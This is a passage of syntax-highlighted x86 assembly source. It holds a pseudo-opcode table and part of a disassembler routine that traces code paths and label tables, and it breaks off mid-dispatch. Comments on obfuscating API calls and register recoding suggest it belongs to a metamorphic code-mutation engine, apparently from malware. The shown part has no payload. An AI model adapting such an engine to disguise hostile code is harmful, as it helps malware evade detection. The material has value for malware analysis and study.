</span><span class="sc1">;;              +01: Memory address struct</span><span class="sc0">
</span><span class="sc1">;;              +07: Source register</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;           Mem,Imm:</span><span class="sc0">
</span><span class="sc1">;;              +01: Memory address struct</span><span class="sc0">
</span><span class="sc1">;;              +07: DWORD immediate value, zero extended if it's a 8-bits op.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  From this rules, now we use the next pseudo-opcodes:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;    00: ADD, 08: OR, 20: AND, 28: SUB, 30: XOR, 38: CMP, 40: MOV, 48: TEST</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;    Set rules: +00: Reg,Imm</span><span class="sc0">
</span><span class="sc1">;;               +01: Reg,Reg</span><span class="sc0">
</span><span class="sc1">;;               +02: Reg,Mem</span><span class="sc0">
</span><span class="sc1">;;               +03: Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;               +04: Mem,Imm</span><span class="sc0">
</span><span class="sc1">;;               +80: 8 bits operation</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;    So, opcode 83 means ADD Mem,Reg using 8-bits operands, and so on.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;    50: PUSH Reg</span><span class="sc0">
</span><span class="sc1">;;    51: PUSH Mem</span><span class="sc0">
</span><span class="sc1">;;    58: POP Reg</span><span class="sc0">
</span><span class="sc1">;;    59: POP Mem</span><span class="sc0">
</span><span class="sc1">;;    68: PUSH Imm</span><span class="sc0">
</span><span class="sc1">;;    70-7F: Conditional jumps</span><span class="sc0">
</span><span class="sc1">;;    E0: NOT Reg</span><span class="sc0">
</span><span class="sc1">;;    E1: NOT Mem</span><span class="sc0">
</span><span class="sc1">;;    E2: NOT Reg8</span><span class="sc0">
</span><span class="sc1">;;    E3: NOT Mem8</span><span class="sc0">
</span><span class="sc1">;;    E4: NEG Reg</span><span class="sc0">
</span><span class="sc1">;;    E5: NEG Mem</span><span class="sc0">
</span><span class="sc1">;;    E6: NEG Reg8</span><span class="sc0">
</span><span class="sc1">;;    E7: NEG Mem8</span><span class="sc0">
</span><span class="sc1">;;    E8: CALL label</span><span class="sc0">
</span><span class="sc1">;;    E9: JMP label</span><span class="sc0">
</span><span class="sc1">;;    EA: CALL Mem (used for API calls)</span><span class="sc0">
</span><span class="sc1">;;    EB: JMP Mem (used for obfuscation in API calls)</span><span class="sc0">
</span><span class="sc1">;;    EC: CALL Reg (obfuscation of API calls)</span><span class="sc0">
</span><span class="sc1">;;    ED: JMP Reg (idem)</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;    F0: SHIFT Reg,Imm</span><span class="sc0">
</span><span class="sc1">;;    F1: SHIFT Mem,Imm</span><span class="sc0">
</span><span class="sc1">;;    F2: SHIFT Reg8,Imm</span><span class="sc0">
</span><span class="sc1">;;    F3: SHIFT Mem8,Imm</span><span class="sc0">
</span><span class="sc1">;;        For all SHIFTs:</span><span class="sc0">
</span><span class="sc1">;;        +07: Byte with the value of rotation/shifting</span><span class="sc0">
</span><span class="sc1">;;        +08: Operation performed: 0: ROL, 8: ROR, 20: SHL, 28: SHR</span><span class="sc0">
</span><span class="sc1">;;    F4: APICALL_BEGIN</span><span class="sc0">
</span><span class="sc1">;;        Special operation meaning PUSH EAX/PUSH ECX/PUSH EDX that avoids</span><span class="sc0">
</span><span class="sc1">;;        the recoding of these registers, always remaining the same.</span><span class="sc0">
</span><span class="sc1">;;    F5: APICALL_END</span><span class="sc0">
</span><span class="sc1">;;        The complementary of APICALL_BEGIN, it means POP EDX/POP ECX/POP EAX</span><span class="sc0">
</span><span class="sc1">;;    F6: APICALL_STORE</span><span class="sc0">
</span><span class="sc1">;;        +01: Memory address struct</span><span class="sc0">
</span><span class="sc1">;;        This always means: MOV [Mem],EAX &lt;-- Avoiding the recoding of EAX</span><span class="sc0">
</span><span class="sc1">;;    F7: SET_WEIGHT</span><span class="sc0">
</span><span class="sc1">;;        +01: Memory address struct</span><span class="sc0">
</span><span class="sc1">;;        +07: Weight item identificator</span><span class="sc0">
</span><span class="sc1">;;        +08: Register 1</span><span class="sc0">
</span><span class="sc1">;;        +09: Register 2</span><span class="sc0">
</span><span class="sc1">;;    F8: MOVZX</span><span class="sc0">
</span><span class="sc1">;;        Memory address struct is a 8-bits operand, while +07 is a 32 bit reg.</span><span class="sc0">
</span><span class="sc1">;;    FC: LEA</span><span class="sc0">
</span><span class="sc1">;;    FE: RET</span><span class="sc0">
</span><span class="sc1">;;    FF: NOP</span><span class="sc0">
</span><span class="sc1">;; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The decodification, as you will see, it's not arbitrary, I mean, there</span><span class="sc0">
</span><span class="sc1">;; is a reason for every format of decodification in every instruction.</span><span class="sc0">
</span><span class="sc1">;; Although many times the format is in that way due to thinking on simplicity,</span><span class="sc0">
</span><span class="sc1">;; other times I changed the format to make code reduction easier.</span><span class="sc0">

</span><span class="sc1">;;  ESI = Start of code to dissasemble</span><span class="sc0">
</span><span class="sc5">DisasmCode</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Initialize the number of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabelsPost</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; labels and the number</span><span class="sc0">
                                                      </span><span class="sc1">; of buffered labels</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000h</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; Initialize the path marks</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PathMarksTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@@LoopInitializePathTable</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Fill all the buffers with 0</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopInitializePathTable</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc1">;; Let's disassemble the given code address (ESI) into the buffer where we</span><span class="sc0">
  </span><span class="sc1">;;construct the whole code in pseudoassembler (EDI)</span><span class="sc0">
      </span><span class="sc5">@@LoopTrace</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc5">@@CheckCurrentLabel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; Check if the current code is already</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CODE_SECTION</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; disassembled</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PathMarksTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; If the mark in the path is != 0,</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; then it's already disassembled.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@CheckIfFutureLabelArrived</span><span class="sc0">

   </span><span class="sc1">;; If it's already disassembled, it's because the current code is inside</span><span class="sc0">
   </span><span class="sc1">;; a loop, or is referenced by a label that we disassembled before. So, we</span><span class="sc0">
   </span><span class="sc1">;; find the referenced code and we insert a JMP to there, and after that we</span><span class="sc0">
   </span><span class="sc1">;; get a new EIP from the list of "future labels".</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the first instruction</span><span class="sc0">
        </span><span class="sc5">@@CheckCurrEIP_001</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Search the pointer at all the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; disassembled instructions. When we</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ItsTheCurrentEIP</span><span class="sc0"> </span><span class="sc1">; find it, we'll insert a JMP to that</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">; instruction.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CheckCurrEIP_001</span><span class="sc0">
        </span><span class="sc5">@@ItsTheCurrentEIP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">; Set the new pointer.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the label mark.</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0"> </span><span class="sc1">; Clear it.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">       </span><span class="sc1">; Set the JMP to the already</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; disassembled code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; Insert the label</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InsertLabel</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">        </span><span class="sc1">; Increment the EIP</span><span class="sc0">

     </span><span class="sc1">; Now get a new EIP to disassemble.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabelsPost</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the number of</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; labels. If it's 0, we haven't more branches</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@FinDeTraduccion</span><span class="sc0"> </span><span class="sc1">; to disassemble, so we finish and</span><span class="sc0">
                                        </span><span class="sc1">; return.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FutureLabelTable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the table address</span><span class="sc0">
      </span><span class="sc5">@@LoopCheckOtherFutureLabel</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; Look for a not disassembled label</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OtherFutureLabelFound</span><span class="sc0">
      </span><span class="sc5">@@LoopSearchOtherFutureLabel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopCheckOtherFutureLabel</span><span class="sc0">
                                       </span><span class="sc1">; Now we have a new EIP in ESI</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabelsPost</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FutureLabelTable</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@LoopCheckOtherFutureLabel2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Check the other labels at the table.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; If we found one already disassembled,</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LoopSearchOtherFutureLabel2</span><span class="sc0"> </span><span class="sc1">; we eliminate it from the</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">       </span><span class="sc1">; list and insert the new label in the</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CODE_SECTION</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; table of definitive</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PathMarksTable</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; labels.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReleaseLabelsInThatAddress</span><span class="sc0">
      </span><span class="sc5">@@LoopSearchOtherFutureLabel2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopCheckOtherFutureLabel2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GetEIPFromFutureLabelList</span><span class="sc0">

       </span><span class="sc5">@@ReleaseLabelsInThatAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; Release the label. This means store</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; the labels already disassembled in the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; definitive label table, and all that.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseFutureLabels</span><span class="sc0"> </span><span class="sc1">; It checks the current EIP in ESI.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopSearchOtherFutureLabel2</span><span class="sc0">

        </span><span class="sc5">@@OtherFutureLabelFound</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set the label at the JUMP or</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; displacement instruction</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Eliminate the label from the future</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopSearchOtherFutureLabel</span><span class="sc0"> </span><span class="sc1">; label list</span><span class="sc0">

     </span><span class="sc5">@@CheckIfFutureLabelArrived</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Clear the label mark...</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseFutureLabels</span><span class="sc0"> </span><span class="sc1">; ...and release the temporary</span><span class="sc0">
                                            </span><span class="sc1">; labels</span><span class="sc0">
      </span><span class="sc5">@@SigueInstr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">; Set the current EIP at the pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; field.</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CODE_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PathMarksTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Mark address as already decoded</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">       </span><span class="sc1">; OP Reg,Reg, Mem,Reg or Reg,Mem?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@GenericOpcode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">47h</span><span class="sc0">       </span><span class="sc1">; INC Reg?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Op_INC</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">       </span><span class="sc1">; DEC Reg?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Op_DEC</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Fh</span><span class="sc0">       </span><span class="sc1">; PUSH Reg/POP Reg?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Op_PUSHPOP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">       </span><span class="sc1">; PUSH Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Op_PUSHValue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc0">       </span><span class="sc1">; PUSH sign-extended Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Op_PUSHSignedValue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">       </span><span class="sc1">; Short conditional jump?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@SigueInstr_00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Jcc</span><span class="sc0">
       </span><span class="sc5">@@SigueInstr_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">       </span><span class="sc1">; Reg,Imm or Mem,Imm?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@SigueInstr_01</span><span class="sc0">
